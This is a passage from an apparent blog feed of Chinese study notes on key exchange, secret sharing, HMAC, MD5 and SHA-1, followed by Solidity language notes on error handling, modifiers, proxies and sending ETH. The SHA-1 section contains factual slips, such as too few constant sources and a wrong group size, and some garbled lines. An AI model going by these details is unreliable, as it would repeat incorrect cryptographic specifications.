href="#diffie-hellman-交换"></a> Diffie-Hellman 交换</h4><p>密钥交换是实现安全通信的基础</p><h5 id="密钥交换的方法"><a class="markdownIt-Anchor" href="#密钥交换的方法"></a> 密钥交换的方法</h5><p>基于RSA的密钥交换<br>基于KDC技术<br>Diffie-Hellman密钥交换<br>基于物理层的交换</p><h6 id="dh算法"><a class="markdownIt-Anchor" href="#dh算法"></a> DH算法</h6><p>该算法的唯一目的是使得两个用户能够安全交换密钥，算法本身不能用于加解密。</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604170517.png" alt><br>敌手只能得到p、a、YA、YB，无法得到密钥。</p><h6 id="安全问题"><a class="markdownIt-Anchor" href="#安全问题"></a> 安全问题</h6><p>算法的安全性基于求离散对数的困难性。</p><ol><li>容易遭受阻塞攻击<br>因为幂运算是计算密集性的，当敌手发起大量的密钥<br>请求，受攻击者将花费较大计算资源来做幂运算；</li><li>容易遭受中间人攻击<br>敌手可分别冒充用户A和B中的一方，与另一方交<br>换密钥（敌手就可以监听和传递A和B的秘密信息而不被发现）。</li></ol><h5 id="秘密分割"><a class="markdownIt-Anchor" href="#秘密分割"></a> 秘密分割</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604171254.png" alt></p><h6 id="shamir门限方案"><a class="markdownIt-Anchor" href="#shamir门限方案"></a> Shamir门限方案</h6><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604171602.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604171628.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604171654.png" alt></p><h6 id="基于中国剩余定理的门限方案"><a class="markdownIt-Anchor" href="#基于中国剩余定理的门限方案"></a> 基于中国剩余定理的门限方案</h6><p>分解秘密<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604173918.png" alt><br>恢复秘密<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604173954.png" alt></p><h3 id="第六章-消息认证和哈希函数"><a class="markdownIt-Anchor" href="#第六章-消息认证和哈希函数"></a> 第六章 消息认证和哈希函数</h3><h4 id="消息认证"><a class="markdownIt-Anchor" href="#消息认证"></a> 消息认证</h4><p>信息安全一方面要实现消息的保密传送，可抵抗被动攻击，如窃听攻击等；另一方面还要防止攻击者对系统的主动攻击，如伪造或纂改消息。<br>认证是对抗主动攻击的主要方法，分为实体认证，和消息认证。<br>实体认证：验证实体的身份<br>消息认证：验证消息的真实性<br>验证消息来源的真实性，称之为信息源认证。<br>验证消息的完整性，即验证消息在传输和存储过程中没有被纂改、伪造。</p><p>消息认证的基础是生成消息认证码(MAC，Message Authentication Code)，用来检查消息是否被恶意修改。</p><p>认证码与通信学中的检错码不同:</p><p>检错码是用来检测由于通信的缺陷而导致消息发生错误的特殊代码<br>认证码是用来防止攻击者恶意篡改或伪造消息<br>消息认证码利用消息和双方共享的密钥通过认证函数来生成一个固定长度的短数据块，并将该数据块附加在消息后。</p><h4 id="hmac"><a class="markdownIt-Anchor" href="#hmac"></a> HMAC</h4><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604213351.png" alt></p><p>K表示密钥，密钥长度可以是任意长度,最小推荐长度nbit，因为小于nbit会显著降低函数的安全性，大nbit也不会增加安全性<br>M 表示HMAC的消息输入<br>L 表示消息M中的分组数<br>Yi 表示消息M的第i 个分组<br>b 表示每个分组包含的比特数<br>n 表示嵌入的散列函数产生的散列码长度<br>IV 表示初始链接变量<br>ipad表示字节0x36重复 b/8次后的结果<br>opad表示字节0x5C重复 b/8次后的结果<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604213606.png" alt><br>操作流程：<br>（1）密钥K 的左边填充0 ，以产生一个b 比特长<br>(例如K 的长为160 比特，b = 512 ，则需填充44 个零字节0x00)。<br>（2）K+ 与ipad逐比特异或产生b比特的分组Si<br>（3）将消息M 附加到Si 后<br>（4）将Hash函数H 作用于步骤（3）的结果，生成消息摘要<br>（5）K+ 与opad逐比特异或产生b比特的分组S0<br>（6）将步骤(4)生成的消息摘要链接在S0 后<br>（7）将Hash函数H 作用于步骤(6)的结果，生成消息摘要，并输出最终结果<br>实现HMAC的有效方式：<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604213703.png" alt></p><h4 id="哈希函数"><a class="markdownIt-Anchor" href="#哈希函数"></a> 哈希函数</h4><h5 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h5><p>Hash 函数也称散列函数、杂凑函数，是一个从消息空间到像空间的不可逆映射。hash函数能将任意长度的消息经过hash变换为固定长度的像。所以是一种具有压缩性质的单向函数。通常称其为数字指纹、消息摘要或散列值。<br>散列值的生成过程为： h=H(M)<br>H可用于任意长度的消息。<br>H产生定长的输出<br>对任意消息x,计算H(x)很容易，易于软硬件实现。<br>单向性：又称抗原像性，即给定任意H(x)，要找出x在计算上是不可行的。<br>抗强碰撞性：找到任意满足H(x)=H(y)的偶对x=y,在计算上是不可行的<br>抗弱碰撞性：又称抗第二原像性，给定任意消息x ,找到满足y!=x且H(y)=H(x)的消息在计算上是不可行的。</p><h5 id="函数结构"><a class="markdownIt-Anchor" href="#函数结构"></a> 函数结构</h5><p>MD结构：将输入的消息分为L个固定长度的的分组，每组长度为b位，若最后一个分组长度不为b位则需要填充。<br>迭代结构包含一个压缩函数f。函数f有两个输入，一个是前一次迭代的n为输出，一个是消息的b位分组，并产生一个n位的输出。因为一般情况来说消息分组长度b大于输出长度n，所以称为压缩函数<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604111951.png" alt></p><h5 id="生日攻击"><a class="markdownIt-Anchor" href="#生日攻击"></a> 生日攻击</h5><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240605205618.png" alt><br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240605205635.png" alt><br>从而当k=100时，这100人中至少有两人生日相同近乎必然事件，然而这个结果似乎不合实际。这就是生日悖论。<br>要找到一个与特定非消息具有相同的散列值的另一个消息的改路很小。如果不指定散列值，只是在两组消息中找到具有相同散列值的两个消息，问题就容易很多。<br>所以攻击者就会利用hash空间不够大易制造碰撞来进行攻击。<br>生日攻击告诉我们：为了能达到 n-bit 的安全性，你所选择的 Hash 函数的散列值长度应该是 2n。</p><p>第一类生日攻击（课本定义）：已知一个哈希函数有n个可能的输出，随机取k个输入，至少有一个输入y使得H(y)=H(x)的概率为0.5时，k=n/2<br>特别地，如果H的输出为m比特长，即可能的输出个数n=2m，则k=n/2=2^(m-1)</p><p>第二类生日攻击（课本定义）：Hash函数有2<sup>m个可能输出，如果k个输入至少有两个产生相同输出的概率大于0.5，则k≈2</sup>(m/2)</p><h5 id="md5哈希算法"><a class="markdownIt-Anchor" href="#md5哈希算法"></a> MD5哈希算法</h5><h6 id="描述"><a class="markdownIt-Anchor" href="#描述"></a> 描述</h6><p>输入长度小于2^64字节的消息，输出长度为128位的消息摘要，输入的消息以512比特分组位单位处理。</p><h6 id="算法流程"><a class="markdownIt-Anchor" href="#算法流程"></a> 算法流程</h6><p>1.对消息填充。 使其比特长在模512下位448<br>，留出64比特。<br>填充方式是固定的：第一位为1，其后各位皆为0.<br>2.附加消息的长度。用留出的64比特，以小端的方式来表示消息被填充前的长度。如果消息大于2^64， 就以2^64为模数取余。<br>前两步执行完以后，分组长为512的分组又可以表示为16个32比特长的字<br>3.对MD缓冲区初始化。算法采用128比特长的缓冲区以存储中间结果和最终哈希值。MD5使用四个32位的寄存器A、B、C、D。最开始存放4个固定的32位参数，即初始链接变量。<br>4.以分组为单位对消息进行处理。迭代压缩处理。<br>5.输出哈希值。将最后一个Hmd5的输出即为产生的消息摘要。（第四轮完成后，做如下运算：A=（A+AA）mod 232,B=（B+BB）mod 232,C=（C+CC）mod 232,D=（D+DD）mod 232.最后将四个寄存器的值做下一次迭代压缩时 的输入变量，知道最后一个消息分组输出128位的散列值。）</p><h6 id="压缩函数"><a class="markdownIt-Anchor" href="#压缩函数"></a> 压缩函数</h6><p>Hmd5压缩函数有4轮处理过程，每轮对缓冲区ABCD进行16步迭代运算。<br>MD5的步函数，即压缩函数，先取向量( A , B , C , D ) 中的后3个作一次非线性函数运算，然后将所得的结果依次加上第1个变量、M [ j ] 、T[i]，再将所得结果循环左移s 位，并加上( A , B , C , D ) 中的第2个变量B ，最后把新值赋给向量中的第1个变量。</p><p>详细过程如下所示，其中 M[j]为消息分组M的第j （ 0 ≤ j ≤ 15 ）个32bit子分组</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/202406041614319.png" alt></p><ol><li>T[i]指的是常数表T中的第i个字，+为模2^32的加法.</li><li>循环左移 。 &lt;&lt;&lt; s 表示循环左移s位。</li><li>非线性函数。4轮使用四个不同的函数，每轮16步采用同一函数。<br>其中，x 、 y 和 z x、y和zx、y和z是3个32bit的输入变量，输出是一个32bit变量；∧ 、 ∧ 、 ¬ 、 ⊕ \分别表示与、或、非和异或逻辑运算。</li></ol><h5 id="sha-1"><a class="markdownIt-Anchor" href="#sha-1"></a> SHA-1</h5><p>算法的输入：小于2^64比特长的任意消息，分为512比特长的分组。</p><p>算法的输出：160比特长的消息摘要。</p><h6 id="算法步骤"><a class="markdownIt-Anchor" href="#算法步骤"></a> 算法步骤</h6><ol><li>对消息填充，让长度满足：<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604205025.png" alt><br>消息的长度为24位，64位留下作为表示消息的长度，那么512-64-24=424，因此424位就补位64位，表示消息长度，因此消息长度的最大值不能超过2^64</li><li>分组处理（迭代压缩）。<br>对消息进行分组，每组64位，一共有16组。<br>SHA1以512位的分组为单位处理消息，算法核心是一个包含4个循环的模块，每个环由20个步骤组成，每个循环使用的步函数相同，不同的循环中步函数包含不同的非线性函数(Ch、Parity、Maj、Parity)。</li></ol><p>每一步函数的输入也不相同，除了寄存器A 、 B 、 C 、 D 和E 外，还有额外常数K 、与消息分组相关的W[t]，其中t ( 0 ≤ t ≤ 79 ) 为步数。<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604205517.png" alt></p><h6 id="压缩函数-2"><a class="markdownIt-Anchor" href="#压缩函数-2"></a> 压缩函数</h6><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604205554.png" alt><br>1.常数Kt<br>K的4 个取值分别为2 、 3 和10 的平方根，然后再乘以2^{30}=1073741824，最后取结果整数部分的十六进制。<br>2. 循环左移<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604210343.png" alt><br>3. 生成字<br>32bit的字Wt从512bit消息分组中导出，在前16步处理中Wt值等于消息分组中的相应字</p><p><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604210910.png" alt></p><p>与MD5比较，MD5直接中一个消息分组的16个字作为每步迭代的输入，而SHA-1则是将输入分组的16个字扩展成80各自以供压缩函数使用，从而使得寻找具有相同的压缩值的不同消息分组更为困难。<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240604211222.png" alt></p><h5 id="sha-与md5的比较"><a class="markdownIt-Anchor" href="#sha-与md5的比较"></a> SHA 与MD5的比较</h5><ol><li>抗穷搜索攻击的强度：<br>SHA 和MD5 的消息摘要长度位160和128，而要用穷搜索攻击找出具有相同消息摘要的不同消息需做2<sup>80与2</sup>64次运算。SHA的抗穷搜索攻击的强度更高。</li><li>抗击密码分析的强度：<br>SHA设计准则未被公开，应该更高。</li><li>速度：<br>都是模2^32的加法运算，但是，SHA迭代步数更高 ，所用缓冲区更大，所以相同硬件下SHA更慢。</li><li>数据的存储方式：<br>MD5采用小端方式，SHA采用大端方式。</li><li>简洁与紧致性：<br>都挺简单的。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Education </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity</title>
      <link href="/2024/05/28/solidity/"/>
      <url>/2024/05/28/solidity/</url>
      
        <content type="html"><![CDATA[<h3 id="错误处理及异常assert-require-revert"><a class="markdownIt-Anchor" href="#错误处理及异常assert-require-revert"></a> 错误处理及异常：Assert, Require, Revert</h3><h4 id="用-assert-检查异常panic-和-require-检查错误error"><a class="markdownIt-Anchor" href="#用-assert-检查异常panic-和-require-检查错误error"></a> 用 assert 检查异常(Panic) 和 require 检查错误(Error)</h4><p>assert和require可用于检查条件并抛出异常<br>assert函数会创建一个Painc（uint256）的错误，只用于测试内部错误，检查不变量。<br>下列情况将会产生一个Panic异常： 错误数据会提供的错误码编号，用来指示Panic的类型：</p><p>0x00: 用于常规编译器插入的Panic。<br>0x01: 如果你调用 assert 的参数（表达式）结果为 false 。<br>0x11: 在 unchecked { … } 外，如果算术运算结果向上或向下溢出。<br>0x12; 如果你用零当除数做除法或模运算（例如 5 / 0 或 23 % 0 ）。<br>0x21: 如果你将一个太大的数或负数值转换为一个枚举类型。<br>0x22: 如果你访问一个没有正确编码的存储byte数组.<br>0x31: 如果在空数组上 .pop() 。<br>0x32: 如果你访问 bytesN 数组（或切片）的索引太大或为负数。(例如： x[i] 而 i &gt;= x.length 或 i &lt; 0).<br>0x41: 如果你分配了太多的内内存或创建了太大的数组。<br>0x51: 如果你调用了零初始化内部函数类型变量。</p><p>assert当参数是false时会抛出panic异常，立即停止执行剩余代码，回滚当前交易所有状态变更(即任何更改不会保存在链上)，交易失败所消耗的gas不会返还。</p><p>require函数可以创建无错误提示的错误，也可创建一个 Error(string) 类型的错误。<br>下列情况将会产生一个 Error(string) （或无错误提示）的错误：</p><p>如果你调用 require(x) ，而 x 结果为 false 。<br>如果你使用 revert() 或者 revert(“description”) 。<br>如果你在不包含代码的合约上执行外部函数调用。<br>如果你通过合约接收以太币，而又没有 payable 修饰符的公有函数（包括构造函数和 fallback 函数）。<br>如果你的合约通过公有 getter 函数接收 Ether 。</p><h4 id="revert"><a class="markdownIt-Anchor" href="#revert"></a> revert</h4><p>可以使用revert语句和函数来直接触发回退。<br>revert 语句将一个自定义的错误作为直接参数，没有括号：</p><p>revert CustomError(arg1, arg2);<br>由于向后兼容，还有一个 revert() 函数，它使用圆括号接受一个字符串：</p><p>revert(); revert(“description”);</p><h3 id="合约"><a class="markdownIt-Anchor" href="#合约"></a> 合约</h3><h4 id="函数修改器"><a class="markdownIt-Anchor" href="#函数修改器"></a> 函数修改器</h4><p>它们可以在执行函数之前自动检查某个条件。 修改器modifier 是合约的可继承属性，并可能被派生合约覆盖 , 但前提是它们被标记为 virtual.。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// 建立了一个NoteBook的合约，只有NoteBook的拥有者才可以修改其内容record</span><span class="token keyword">contract</span> <span class="token class-name">NoteBook</span><span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> <span class="token keyword">public</span> record<span class="token punctuation">;</span> <span class="token comment">// NoteBook的内容</span>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span><span class="token comment">// NoteBook的拥有者</span>        <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 修改record的内容</span>    <span class="token keyword">function</span> <span class="token function">changeRecord</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> _record<span class="token punctuation">)</span> <span class="token keyword">public</span> isOwner <span class="token punctuation">&#123;</span>        record <span class="token operator">=</span> _record<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 函数修改器：判断是否是NoteBook的</span>    <span class="token keyword">modifier</span> isOwner<span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">,</span> <span class="token string">"You are not the owner of this NoteBook"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述例子中，我们通过关键字 modifier 后面接函数修改器名 NoteBook 来定义一个modifier。在上述定义的modifier中如果调用者不是拥有者则会停止执行接下来的代码，并在控制台输出自定义的原因。如果是的话则执行到 _ 处，_ 代表使用该modifier的函数体，这里即为changeRecord 函数的函数体。在执行changeRecord 函数前先会使用isOwner进行检查，没有问题后才会执行。</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">modifierOder</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> a<span class="token punctuation">;</span>        <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token builtin">uint</span> num<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token function">checkPara</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 修改a </span>    <span class="token keyword">modifier</span> <span class="token function">checkPara</span><span class="token punctuation">(</span><span class="token builtin">uint</span> number<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如以上代码所示：在 _后又有一句代码a = 100 。函数执行完return后，后面的代码则不再执行，但是在modifier中，执行完函数体 _ 还会接着执行 a = 100 这条语句。所以尽管函数返回的a 的值为10，但是最后a的值变成了100。</p><h4 id="constant-和-immutable-状态变量"><a class="markdownIt-Anchor" href="#constant-和-immutable-状态变量"></a> Constant 和 Immutable 状态变量</h4><p>对于 constant 常量, 他的值在编译器确定，而对于 immutable(不可变量), 它的值在部署时确定。<br>对于constant状态量，只能使用那些在编译时有确定值的表达式 ，任何通过访问 storage，区块链数据（例如 block.timestamp, address(this).balance 或者 block.number）或执行数据（ msg.value 或 gasleft() ） 或对外部合约的调用来给它们赋值都是不允许的。<br>内建（built-in）函数 keccak256 ， sha256 ， ripemd160 ， ecrecover ， addmod 和 mulmod 是允许的（即使他们确实会调用外部合约， keccak256 除外）。<br>对于immutable，可以在合约的构造函数中或声明时为不可变的变量分配任意值。 不可变量只能赋值一次，并且在赋值之后才可以读取。</p><h4 id="状态可变性"><a class="markdownIt-Anchor" href="#状态可变性"></a> 状态可变性</h4><h5 id="view"><a class="markdownIt-Anchor" href="#view"></a> view</h5><p>要求保证不修改状态<br>下面的语句被认为是修改状态：</p><p>修改状态变量。<br>产生事件。<br>创建其它合约。<br>使用 selfdestruct。<br>通过调用发送以太币。<br>调用任何没有标记为 view 或者 pure 的函数。<br>使用低级调用。<br>使用包含特定操作码的内联汇编。</p><h5 id="pure"><a class="markdownIt-Anchor" href="#pure"></a> pure</h5><p>函数可以声明为 pure ，在这种情况下，承诺不读取也不修改状态变量。</p><p>特别是，应该可以在编译时确定一个 pure 函数，它仅处理输入参数和 msg.data ，对当前区块链状态没有任何了解。 这也意味着读取 immutable 变量也不是一个 pure 操作。<br>除了上面解释的状态修改语句列表之外，以下被认为是读取状态：</p><p>读取状态变量。<br>访问 address(this).balance 或者 <address>.balance。<br>访问 block，tx， msg 中任意成员 （除 msg.sig 和 msg.data 之外）。<br>调用任何未标记为 pure 的函数。<br>使用包含某些操作码的内联汇编。</address></p><h4 id="event"><a class="markdownIt-Anchor" href="#event"></a> Event</h4><p>在Solidity 代码中，使用event 关键字来定义一个事件，这个用法和定义函数式一样的，并且事件在合约中同样可以被继承。触发一个事件使用emit(说明，之前的版本里并不需要使用emit)，触发事件可以在任何函数中调用。</p><h4 id="继承"><a class="markdownIt-Anchor" href="#继承"></a> 继承</h4><p>父合约标记为 virtual 函数可以在继承合约里重写(overridden)以更改他们的行为。重写的函数需要使用关键字 override 修饰<br>重写函数只能将覆盖函数的可见性从 external 更改为 public 。<br>可变性可以按照以下顺序更改为更严格的一种： nonpayable 可以被 view 和 pure 覆盖。 view 可以被 pure 覆盖。 payable 是一个例外，不能更改为任何其他可变性<br>如果函数没有标记为 virtual ， 那么派生合约将不能更改函数的行为(即不能重写)<br>对于多重继承，如果有多个父合约有相同定义的函数， override 关键字后必须指定所有父合约名。<br>如果（重写的）函数继承自一个公共的父合约， override 是可以不用显示指定的<br>private 的函数是不可以标记为 virtual 的。<br>除接口之外（因为接口会自动作为 virtual ），没有实现的函数必须标记为 virtual<br>从 Solidity 0.8.8 开始, 在重写接口函数时不再要求 override 关键字，除非函数在多个父合约定义。<br>尽管 public 的状态变量可以重写外部函数，但是 public 的状态变量不能被重写。</p><h4 id="代理合约"><a class="markdownIt-Anchor" href="#代理合约"></a> 代理合约</h4><p>Solidity合约部署在链上之后，代码是不可变的（immutable）。这样既有优点，也有缺点：</p><p>优点：安全，用户知道会发生什么（大部分时候）。<br>坏处：就算合约中存在bug，也不能修改或升级，只能部署新合约。但是新合约的地址与旧的不一样，且合约的数据也需要花费大量gas进行迁移。<br>有没有办法在合约部署后进行修改或升级呢？答案是有的，那就是代理模式。<br><img src="https://cdn.jsdelivr.net/gh/xiaoxiaoxiaoxiaocai/Drawing-bed/draw-bed/20240620163158.png" alt><br>代理模式将合约数据和逻辑分开，分别保存在不同合约中。我们拿上图中简单的代理合约为例，数据（状态变量）存储在代理合约中，而逻辑（函数）保存在另一个逻辑合约中。代理合约（Proxy）通过delegatecall，将函数调用全权委托给逻辑合约（Implementation）执行，再把最终的结果返回给调用者（Caller）。</p><p>代理模式主要有两个好处：</p><p>可升级：当我们需要升级合约的逻辑时，只需要将代理合约指向新的逻辑合约。<br>省gas：如果多个合约复用一套逻辑，我们只需部署一个逻辑合约，然后再部署多个只保存数据的代理合约，指向逻辑合约。</p><h4 id="发送eth"><a class="markdownIt-Anchor" href="#发送eth"></a> 发送eth</h4><ol><li>transfer<br>用法是接收方地址.transfer(发送ETH数额)。<br>transfer()的gas限制是2300，足够用于转账，但对方合约的fallback()或receive()函数不能实现太复杂的逻辑。<br>transfer()如果转账失败，会自动revert（回滚交易）。<br>代码样例，注意里面的_to填ReceiveETH合约的地址，amount是ETH转账金额：</li></ol><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// 用transfer()发送ETH</span><span class="token keyword">function</span> <span class="token function">transferETH</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>    _to<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>send<br>用法是接收方地址.send(发送ETH数额)。<br>send()的gas限制是2300，足够用于转账，但对方合约的fallback()或receive()函数不能实现太复杂的逻辑。<br>send()如果转账失败，不会revert。<br>send()的返回值是bool，代表着转账成功或失败，需要额外代码处理一下。</li></ol><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// send()发送ETH</span><span class="token keyword">function</span> <span class="token function">sendETH</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 处理下send的返回值，如果失败，revert交易并发送error</span>    <span class="token builtin">bool</span> success <span class="token operator">=</span> _to<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>success<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">revert</span> <span class="token function">SendFailed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>call<br>用法是接收方地址.call{value: 发送ETH数额}(“”)。<br>call()没有gas限制，可以支持对方合约fallback()或receive()函数实现复杂逻辑。<br>call()如果转账失败，不会revert。<br>call()的返回值是(bool, data)，其中bool代表着转账成功或失败，需要额外代码处理一下。</li></ol><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// call()发送ETH</span><span class="token keyword">function</span> <span class="token function">callETH</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 处理下call的返回值，如果失败，revert交易并发送error</span>    <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> _to<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> amount<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>success<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">revert</span> <span class="token function">CallFailed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>call没有gas限制，最为灵活，是最提倡的方法；<br>transfer有2300 gas限制，但是发送失败会自动revert交易，是次优选择；<br>send有2300 gas限制，而且发送失败不会自动revert交易，几乎没有人用它。</p><h4 id="try-catch"><a class="markdownIt-Anchor" href="#try-catch"></a> try catch</h4><p>在solidity中，try-catch只能被用于external函数或创建合约时constructor（被视为external函数）的调用。基本语法如下：</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity">try externalContract<span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// call成功的情况下 运行一些代码</span><span class="token punctuation">&#125;</span> catch <span class="token punctuation">&#123;</span>    <span class="token comment">// call失败的情况下 运行一些代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中externalContract.f()是某个外部合约的函数调用，try模块在调用成功的情况下运行，而catch模块则在调用失败时运行。</p><p>同样可以使用this.f()来替代externalContract.f()，this.f()也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。</p><p>如果调用的函数有返回值，那么必须在try之后声明returns(returnType val)，并且在try模块中可以使用返回的变量；如果是创建合约，那么返回值是新创建的合约变量。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn 2024</title>
      <link href="/2024/05/27/ciscn-2024/"/>
      <url>/2024/05/27/ciscn-2024/</url>
      
